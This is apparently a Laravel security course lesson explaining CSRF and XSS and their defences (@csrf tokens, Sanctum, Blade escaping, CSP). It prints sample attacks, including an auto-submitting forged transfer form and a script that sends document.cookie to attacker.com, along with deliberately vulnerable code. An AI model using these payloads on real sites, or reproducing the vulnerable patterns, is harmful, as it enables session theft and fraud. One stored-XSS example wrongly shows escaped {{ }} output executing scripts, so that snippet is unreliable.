# 05 - CSRF & XSS - Complete Security Mastery

## Understanding CSRF & XSS

### What Are These Attacks?

**CSRF (Cross-Site Request Forgery)** and **XSS (Cross-Site Scripting)** are two of the most common web vulnerabilities. They exploit the trust between users and websites in different ways.

---

## PART 1: CSRF - Cross-Site Request Forgery

### What is CSRF?

CSRF is an attack where a malicious website tricks your browser into making unwanted requests to a legitimate website where you're logged in.

### How CSRF Attack Works

**The Attack Scenario:**

1. You log into your bank website (`bank.com`)
   - Browser gets a session cookie
   - You stay logged in

2. You open a new tab and visit a malicious site (`evil.com`)
   - Without closing your bank tab

3. That malicious site contains:

   ```html
   <img src="https://bank.com/transfer?to=attacker&amount=1000" />
   ```

4. Your browser sees this image tag and automatically:
   - Makes a GET request to `bank.com`
   - Includes your session cookie (automatically sent!)
   - Completes the transfer without your knowledge

5. **Result:** Money transferred from YOUR account to attacker's account, without your consent!

### Why This Works

- **Browsers automatically send cookies** for requests to the same domain
- Your bank sees a request with your valid session cookie
- Your bank thinks it's YOU making the request
- The bank processes the transfer

### Real-World Example

```html
<!-- Malicious site could be disguised as -->
<img src="https://yourbank.com/api/transfer?amount=50000&to=attacker" />

<!-- Or with forms -->
<form action="https://yourbank.com/transfer" method="POST">
  <input name="amount" value="50000" />
  <input name="to" value="attacker_account" />
</form>
<script>
  document.forms[0].submit(); // Auto-submit without user knowing
</script>
```

---

### How @csrf Token Protects Forms

#### What is a CSRF Token?

A CSRF token is a unique, random string that:

1. Is generated per session and per form
2. Is stored on the server
3. Is embedded in forms
4. Must be submitted with the form
5. Server validates it matches

#### Why It's Safe

**Attacker can't get the token because:**

- It's dynamically generated per session
- It's not sent in cookies (it's in form data)
- Same-origin policy prevents cross-site scripts from reading it
- Even if attacker knows the URL pattern, they don't know YOUR token

#### How to Use in Laravel

**In Blade Templates:**

```blade
<!-- Automatic method -->
<form action="/transfer" method="POST">
    @csrf
    <input name="amount" value="1000">
    <button>Transfer Money</button>
</form>

<!-- Expands to: -->
<!-- <input type="hidden" name="_token" value="abc123xyz..."> -->
```

**Manual inclusion:**

```blade
<form action="/transfer" method="POST">
    <input type="hidden" name="_token" value="{{ csrf_token() }}">
    <input name="amount" value="1000">
</form>
```

#### Server Validation

```php
// Laravel automatically validates CSRF token
// In routes/web.php
Route::post('/transfer', function (Request $request) {
    // Middleware VerifyCsrfToken automatically validates
    // If token missing or invalid, throws exception

    $amount = $request->input('amount');
    // Process transfer safely
});

// The middleware is in app/Http/Middleware/VerifyCsrfToken.php
```

#### What About AJAX?

```javascript
// AJAX with CSRF token
fetch("/api/transfer", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    "X-CSRF-TOKEN": document.querySelector('meta[name="csrf-token"]').content,
  },
  body: JSON.stringify({ amount: 1000 }),
});

// Blade template includes token in meta tag
// <meta name="csrf-token" content="{{ csrf_token() }}">
```

---

### Why Sanctum API Tokens Aren't Vulnerable to CSRF

#### API Tokens vs Session Cookies

**Session Cookies:**

- Automatically sent with every request to the domain
- Sent even for cross-origin requests from malicious sites
- Vulnerable to CSRF

**API Tokens:**

- Must be manually added to headers
- Not automatically sent by browser
- Malicious site can't read them (same-origin policy)
- Cannot be sent without JavaScript (which malicious site can't write)

#### Sanctum Protection Mechanism

```php
// Laravel Sanctum creates personal access tokens
$user = User::find(1);
$token = $user->createToken('api-token')->plainTextToken;
// Returns: "1|xxxxxxxxxxxx" (1 = user ID, rest = token)
```

**Why it's safe:**

1. **Token must be in Authorization header**

   ```
   Authorization: Bearer 1|xxxxxxxxxxxx
   ```

2. **Browsers can't automatically add headers**
   - Only JavaScript can add custom headers
   - Malicious sites can't execute their own JS on your origin

3. **Different origin policy prevents theft**

   ```javascript
   // Malicious site trying to access API
   fetch("https://yourapp.com/api/data"); // Fails!
   // CORS prevents reading response unless server allows
   ```

4. **Token can't be in cookies (for APIs)**
   - API uses `Authorization` header only
   - Not in cookies that auto-send

#### Example: Why Sanctum is Safe

```php
// Malicious site attempts:
// It can make the request, but can't:
// 1. Read the response (blocked by CORS)
// 2. Get the token (not in cookies)
// 3. Add the token header (only your site's JS can do that)
// 4. See any data

// What the server logs:
POST /api/transfer
Authorization: (missing! malicious site didn't provide it)
// Request rejected - no token!
```

---

## PART 2: XSS - Cross-Site Scripting

### What is XSS?

XSS is an attack where malicious JavaScript code is injected into a web page, then executed in other users' browsers.

### How XSS Attack Works

**The Attack Scenario:**

1. A website has a comment form

   ```
   "Enter your comment:"
   ```

2. Attacker enters:

   ```javascript
   <script>
     fetch('https://attacker.com/steal?cookie=' + document.cookie);
   </script>
   ```

3. Comment is stored in database as-is (no escaping!)

4. When other users view the page:
   - The script tag executes
   - Their cookies are sent to attacker
   - Attacker can hijack their session

5. **Result:** User sessions stolen, accounts compromised!

### Types of XSS

#### 1. Stored XSS (Most Dangerous)

```php
// VULNERABLE CODE:
Route::post('/comment', function (Request $request) {
    // Store user input directly without escaping
    Comment::create([
        'content' => $request->input('content')  // ❌ DANGEROUS!
    ]);
});

// When displaying:
@foreach($comments as $comment)
    {{ $comment->content }}  // If has script tags, they execute!
@endforeach
```

#### 2. Reflected XSS

```php
// VULNERABLE:
Route::get('/search', function (Request $request) {
    $query = $request->input('q');
    return "Search results for: " . $query;  // ❌ Unescaped!
});

// Attacker sends:
// https://yoursite.com/search?q=<script>alert('hacked')</script>

// User sees: "Search results for:" and JavaScript executes
```

#### 3. DOM XSS

```javascript
// VULNERABLE:
let userInput = document.querySelector("input").value;
document.querySelector("#output").innerHTML = userInput; // ❌ Dangerous!

// If user input contains script tags, they execute
```

---

### How Blade {{ }} Auto-Escapes

#### Automatic Escaping

```blade
<!-- SAFE: Blade auto-escapes by default -->
{{ $userInput }}

<!-- If $userInput = "<script>alert('hacked')</script>" -->
<!-- Blade converts to: -->
<!-- &lt;script&gt;alert('hacked')&lt;/script&gt; -->
<!-- Browser displays text, doesn't execute -->
```

#### What Gets Escaped

```php
// Original: <script>alert('hacked')</script>
// Escaped:  &lt;script&gt;alert('hacked')&lt;/script&gt;

// Original: <img src=x onerror="alert('xss')">
// Escaped:  &lt;img src=x onerror=&quot;alert('xss')&quot;&gt;

// Original: "><script>alert(1)</script><"
// Escaped:  &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;
```

#### HTML Entities Used

| Character | Escaped  | HTML Entity  |
| --------- | -------- | ------------ |
| `<`       | `&lt;`   | Less than    |
| `>`       | `&gt;`   | Greater than |
| `&`       | `&amp;`  | Ampersand    |
| `"`       | `&quot;` | Quote        |
| `'`       | `&#039;` | Apostrophe   |

#### Safe Display

```blade
<!-- User comment with dangerous content -->
<!-- User input: I love cookies! <img src=x onerror="steal()"> -->

<div class="comment">
    {{ $comment->text }}
    <!-- Displays: "I love cookies! &lt;img src=x onerror=&quot;steal()&quot;&gt;" -->
    <!-- No JavaScript executes! Safe! ✓ -->
</div>
```

#### How Escaping Works in Code

```php
// Blade {{ }} uses htmlspecialchars()
$escaped = htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');

// Example:
$dangerous = '<script>alert("xss")</script>';
$safe = htmlspecialchars($dangerous, ENT_QUOTES, 'UTF-8');
// Result: &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
```

---

### When to Use {!! !!} and Why It's Dangerous

#### What Does {!! !!} Do?

```blade
<!-- {{ }} ESCAPES output -->
{{ "<b>Bold</b>" }}
<!-- Displays: &lt;b&gt;Bold&lt;/b&gt; (as text) -->

<!-- {!! !!} DOES NOT ESCAPE -->
{!! "<b>Bold</b>" !!}
<!-- Displays: Bold (rendered HTML) -->
```

#### Legitimate Uses for {!! !!}

**1. Trusted HTML from Database**

```blade
<!-- You stored formatted HTML you wrote yourself -->
{!! $trustedHtmlContent !!}

<!-- Example: Rich text editor output that YOU CONTROL -->
@php
$aboutUs = '<h2>About Us</h2><p>We are amazing</p>';
@endphp
{!! $aboutUs !!}
```

**2. Markdown or HTML Conversion**

```blade
<!-- Converting markdown to HTML safely -->
{!! Markdown::parse($article->content) !!}
<!-- Markdown library handles security -->
```

**3. Dynamic SVG or Graphics**

```blade
@php
$svg = '<svg><circle cx="50" cy="50" r="40"/></svg>';
@endphp
{!! $svg !!}
```

#### Why {!! !!} Is Dangerous

```blade
<!-- ❌ DANGEROUS: User input with {!! !!} -->
@foreach($comments as $comment)
    {!! $comment->user_input !!}  <!-- NEVER DO THIS! -->
@endforeach

<!-- If user entered: <img src=x onerror="stealCookies()"> -->
<!-- It would execute and steal session! -->
```

#### Safe Pattern: Sanitize Before Using {!! !!}

```php
// Use a sanitization library
use HtmlSanitizer;

Route::post('/comment', function (Request $request) {
    $userInput = $request->input('content');

    // 1. Sanitize (remove dangerous tags, keep safe formatting)
    $sanitized = HtmlSanitizer::clean($userInput);

    // 2. Store sanitized version
    $comment = Comment::create([
        'content' => $sanitized
    ]);

    // 3. Display safely
    return view('comment', ['comment' => $comment]);
});

<!-- In view: -->
{!! $comment->content !!}  <!-- Now safe because it was sanitized -->
```

#### Default Approach: ALWAYS Use {{ }}

```blade
<!-- ✅ SAFE: Always use {{ }} for user input -->
@foreach($comments as $comment)
    <div class="comment">
        <strong>{{ $comment->author }}</strong>
        <p>{{ $comment->content }}</p>
    </div>
@endforeach

<!-- Even if users try to inject code, it's safely escaped -->
```

---

## Defense Checklist

### CSRF Protection Checklist

- ✅ Use `@csrf` in all forms
- ✅ Include `X-CSRF-TOKEN` header in AJAX requests
- ✅ Use Sanctum tokens for API instead of cookies
- ✅ Never disable CSRF middleware
- ✅ Use SameSite cookie attribute
- ✅ Verify token on server for state-changing requests

### XSS Protection Checklist

- ✅ Always use `{{ }}` for user input
- ✅ Only use `{!! !!}` for trusted content
- ✅ Sanitize HTML if you must display it
- ✅ Use Content Security Policy (CSP) headers
- ✅ Validate and sanitize on server
- ✅ Never trust client-side validation alone

---

## Security Headers

### Prevent XSS with CSP

```php
// In app/Http/Middleware/SecurityHeaders.php
header("Content-Security-Policy: default-src 'self'; script-src 'self'");

// Prevents inline scripts and limits to same-origin
// Even if XSS payload is injected, scripts won't execute
```

### Additional Headers

```php
// X-Content-Type-Options: Prevent MIME-sniffing
header("X-Content-Type-Options: nosniff");

// X-Frame-Options: Prevent clickjacking (related to CSRF)
header("X-Frame-Options: DENY");

// X-XSS-Protection: Browser XSS filter (legacy, but helpful)
header("X-XSS-Protection: 1; mode=block");

// Referrer-Policy: Limit referrer info
header("Referrer-Policy: strict-origin-when-cross-origin");
```

---

## Best Practices Summary

### Forms

```blade
<!-- Every form must have CSRF token -->
<form method="POST" action="/endpoint">
    @csrf
    <!-- rest of form -->
</form>
```

### User Input

```blade
<!-- Always escape user content -->
<div>{{ $userText }}</div>

<!-- Never do this -->
<div>{!! $userText !!}</div>  <!-- ❌ DANGEROUS -->
```

### API Endpoints

```php
// Use Sanctum tokens, not session cookies
$user->createToken('api')->plainTextToken;

// Validates in middleware:
Route::middleware('auth:sanctum')->group(function () {
    Route::post('/api/transfer', TransferController::class);
});
```

### Database Storage

```php
// Store user input as-is (don't pre-escape)
User::create(['bio' => $request->input('bio')]);

// Escape only when outputting
{{ $user->bio }}  // Safe!
```

---

## Common Vulnerabilities to Avoid

| ❌ Vulnerable           | ✅ Safe                   |
| ----------------------- | ------------------------- |
| `{!! $user->bio !!}`    | `{{ $user->bio }}`        |
| Form without `@csrf`    | Form with `@csrf`         |
| `innerHTML = userInput` | `textContent = userInput` |
| Storing raw HTML input  | Sanitizing before storage |
| No CSP headers          | With CSP headers          |
| No token validation     | Token validated on server |

---

## Checkpoint Questions

1. How does CSRF attack work? Draw the flow.
2. Why does the @csrf token prevent CSRF?
3. How do Sanctum tokens differ from cookies in terms of CSRF?
4. What does Blade {{ }} do to protect against XSS?
5. When is {!! !!} safe to use?
6. What are 3 ways to prevent XSS?
7. How would you sanitize user input?
8. Why shouldn't you disable CSRF middleware?
9. What is Content Security Policy?
10. How would you test if your site is vulnerable?

---

## Resources

- [OWASP CSRF](https://owasp.org/www-community/attacks/csrf)
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [Laravel Security](https://laravel.com/docs/security)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
